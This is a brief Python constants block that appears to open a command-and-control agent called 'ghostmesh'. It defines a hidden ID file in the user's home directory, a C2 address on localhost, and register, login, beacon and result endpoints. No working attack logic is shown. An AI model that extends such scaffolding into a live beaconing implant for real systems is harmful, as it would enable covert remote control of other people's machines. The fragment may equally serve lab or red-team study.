import os
from pathlib import Path


HOME = Path.home()
CONFIG_PATH = HOME / ".ghostmesh_id"
C2_URL = "http://127.0.0.1:8000"
REGISTER_ENDPOINT = "/agent/register"
LOGIN_ENDPOINT = "/agent/login"
BEACON_ENDPOINT = "/agent/beacon"
RESULT_ENDPOINT = "/agent/result"